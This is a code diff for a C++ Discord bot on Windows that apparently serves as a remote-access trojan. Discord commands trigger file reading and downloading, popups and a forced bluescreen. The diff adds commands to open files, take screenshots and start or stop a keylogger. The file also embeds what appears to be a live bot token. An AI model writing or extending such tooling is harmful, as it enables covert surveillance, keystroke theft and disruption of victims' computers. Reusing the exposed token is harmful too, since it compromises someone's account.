@@ -1,10 +1,11 @@
 #include <dpp/dpp.h>
-#include <string>
-#include <Windows.h>
+
+
 #include <vector>
 #include "filesystem.h"
 #include "tasks.h"
-
+#include <string>
+#include <Windows.h>
 using namespace dpp;
 
 const std::string BOT_TOKEN = "OTgxNTk0MjIzMjM5MzY0NjU4.GpMw66.JCIoH9aOa2c5VzA1uv0EnUObVHZr1CtI8tfkCo";
@@ -18,6 +19,10 @@ bool useWaitlist = true;
 
 int main()
 {
+    int v = -5;
+
+    std::cout << std::hex << v << '\n';
+
     init_fsys();
     /* Create bot cluster */
     cluster bot = cluster(BOT_TOKEN, i_all_intents);
@@ -52,6 +57,9 @@ int main()
         else if (args[0] == "readfile") {
             send_message(bot, command_readfile(args, evnt), evnt.msg.channel_id);
         }
+        else if (args[0] == "openfile") {
+            send_message(bot, command_openfile(args, evnt), evnt.msg.channel_id);
+        }
         else if (args[0] == "popup") {
             send_message(bot, command_popup(args), evnt.msg.channel_id);
         }
@@ -76,10 +84,18 @@ int main()
         else if (args[0] == "downloadfile") {
             send_message(bot, command_downloadfile(args, evnt), evnt.msg.channel_id);
         }
+        else if (args[0] == "screenshot") {
+            send_message(bot, command_screenshot(args, evnt), evnt.msg.channel_id);
+        }
         else if (args[0] == "bluescreen") {
             send_message(bot, command_bluescreen(args), evnt.msg.channel_id);
         }
-        
+        else if (args[0] == "keylog_start") {
+            send_message(bot, command_keyloggerstart(args, evnt), evnt.msg.channel_id);
+        }
+        else if (args[0] == "keylog_stop") {
+            send_message(bot, command_keyloggerstop(args, evnt), evnt.msg.channel_id);
+        }
         else if (args[0] == "help") {
             send_message(bot, command_help(args), evnt.msg.channel_id);
         }
